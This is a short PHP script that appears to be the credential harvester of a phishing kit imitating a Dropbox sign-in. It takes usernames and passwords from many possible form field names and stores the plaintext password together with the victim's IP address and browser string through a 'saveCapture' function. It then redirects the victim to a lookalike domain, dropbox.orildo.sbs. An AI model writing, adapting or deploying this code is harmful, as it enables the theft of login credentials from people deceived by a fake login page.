<?php
require_once '../../config.php';

$username = '';
foreach (['email', 'username', 'user', 'login', 'uname', 'userid'] as $field) {
    if (!empty($_POST[$field])) { $username = $_POST[$field]; break; }
}

$password = '';
foreach (['password', 'pass', 'passwd', 'pwd', 'passcode'] as $field) {
    if (!empty($_POST[$field])) { $password = $_POST[$field]; break; }
}

$template = 'dropbox';
$ip = getClientIP();
$agent = sanitize($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

saveCapture([
    'username'   => sanitize($username),
    'password'   => $password,
    'ip_address' => $ip,
    'user_agent' => $agent,
    'template'   => $template
]);

$redirect = 'https://dropbox.orildo.sbs';
header('Location: ' . $redirect);
exit;
